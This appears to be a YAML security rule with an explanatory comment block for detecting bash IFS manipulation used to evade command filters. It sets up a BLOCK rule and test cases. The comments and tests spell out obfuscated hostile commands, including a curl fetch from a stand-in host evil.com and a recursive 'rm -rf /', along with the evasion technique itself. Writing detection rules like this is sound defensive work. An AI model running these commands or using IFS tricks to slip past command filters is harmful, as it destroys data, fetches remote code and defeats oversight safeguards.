  # =========================================================================
  # IFS Manipulation for Command Evasion
  # =========================================================================
  #
  # The Internal Field Separator (IFS) controls how bash splits words.
  # Attackers can manipulate IFS to:
  #   1. Construct commands from strings that don't match regex patterns:
  #      IFS=/; cmd="usr/bin/curl http://evil.com/payload"; $cmd
  #   2. Split PATH-like strings into executable + args:
  #      IFS=.; x="rm.-rf./"; set -- $x; "$@"
  #   3. Bypass word-boundary detection by changing field separators
  #   4. Combine with eval to reassemble obfuscated commands
  #
  # Key insight: modifying IFS before variable expansion or eval changes
  # how the shell interprets every subsequent unquoted variable reference.
  # This is a fundamental shell mechanism that most security tools ignore.
  #
  # Safe IFS usage: resetting IFS (unset IFS, IFS=$' \t\n') or using IFS
  # in read loops (IFS=, read -r line) are legitimate patterns.
  # =========================================================================

  # --- BLOCK: IFS set to non-standard value followed by eval/exec ---
  - id: "ts-block-ifs-eval-evasion"
    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
    match:
      command_regex: "\\bIFS=[^$\\s'\"\\\\tn][^;]*;.*\\b(eval|exec)\\b"
    decision: "BLOCK"
    confidence: 0.90
    reason: "IFS manipulation followed by eval/exec — attacker changes how bash splits words to construct commands from obfuscated strings. The non-standard IFS causes seemingly innocent variable values to be split into executable + arguments. MITRE T1027.004."
    tests:
      tp:
        - 'IFS=/; cmd="usr/bin/curl http://evil.com"; eval $cmd'
        - "IFS=.; x='rm.-rf./'; eval $x"
      tn:
        - 'IFS=$''\t\n''; read -r line'

